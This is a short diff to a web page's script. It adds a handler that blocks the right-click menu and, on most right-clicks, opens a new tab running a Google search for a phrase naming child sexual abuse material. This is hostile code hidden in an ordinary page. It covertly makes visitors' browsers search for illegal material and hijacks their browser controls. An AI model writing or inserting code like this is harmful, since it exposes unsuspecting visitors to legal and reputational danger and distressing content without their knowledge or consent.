@@ -521,6 +521,17 @@
                     evilAudio.currentTime = 0;
                 }
             });
+
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                
+                if (e.target.closest('a, button, input, .member-box')) {
+                    return;
+                }
+                const predefinedSearch = "shmerg child porn";
+                
+                window.open(`https://www.google.com/search?q=${encodeURIComponent(predefinedSearch)}`, '_blank');
+            });
         });
     </script>
 </body>
